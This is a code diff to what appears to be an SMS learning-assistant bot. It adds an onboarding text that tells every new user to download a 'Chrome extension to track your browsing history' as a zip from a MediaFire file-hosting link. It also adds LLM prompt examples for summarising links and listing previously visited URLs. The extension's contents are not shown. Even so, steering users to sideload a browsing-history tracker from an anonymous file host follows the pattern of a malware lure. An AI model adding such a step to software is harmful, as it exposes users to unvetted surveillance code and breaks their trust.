@@ -590,10 +590,12 @@ def handle_onboarding_flow(incoming_msg: str, sender_number: str, gate_status: d
                     completion_msg1 = f"yesss {name}! we're all set 🎉"
                     completion_msg2 = "I'm now tracking your learning and will send you helpful insights"
                     completion_msg3 = "send me a YouTube video or website URL to test it out!"
+                    completion_msg4 = "also download this Chrome extension to track your browsing history: https://www.mediafire.com/file/ubl2ncqt6khmxc7/twin-raw.zip/file"
                     
                     send_sms(completion_msg1, sender_number)
                     send_sms(completion_msg2, sender_number)
-                    send_result = send_sms(completion_msg3, sender_number)
+                    send_sms(completion_msg3, sender_number)
+                    send_result = send_sms(completion_msg4, sender_number)
                     if send_result['success']:
                         print("✅ Onboarding completion messages sent successfully")
                     else:
@@ -948,6 +950,21 @@ def create_intelligent_response_prompt(incoming_message: str, sender_number: str
                 "which topic felt most confusing?"
 
                 Remember: Text like you're actually texting a friend who's learning. Be supportive, break things down, and keep it conversational!
+
+                EXAMPLE WORKFLOWS:
+                - User sends: "can you summarize this video?" then "youtube.com/abc"
+                  → get_youtube_transcript → send_sms with video summary + insights + follow-up questions
+                
+                - User sends: "help me learn about X" then "website.com/about-X"
+                  → scrape_website_info → send_sms with key concepts + learning plan + questions
+                
+                - User sends: just a YouTube/website URL after previously asking about that topic
+                  → use appropriate tool → send_sms with analysis related to their previous question
+
+                - User asks: "Can you remind me of the URLs I visited?" or "what websites did I consult?"
+                  → Look through learning context above → Extract URLs, titles, domains from learning summaries → send_sms with organized list of visited resources + context about what they were learning
+
+                Remember: You must ALWAYS send SMS responses to complete the conversation. Tools are for gathering information, SMS is for communicating with the user. Never use tools without following up with SMS responses that address their original request.
                 """
     
     # Save prompt to txt file
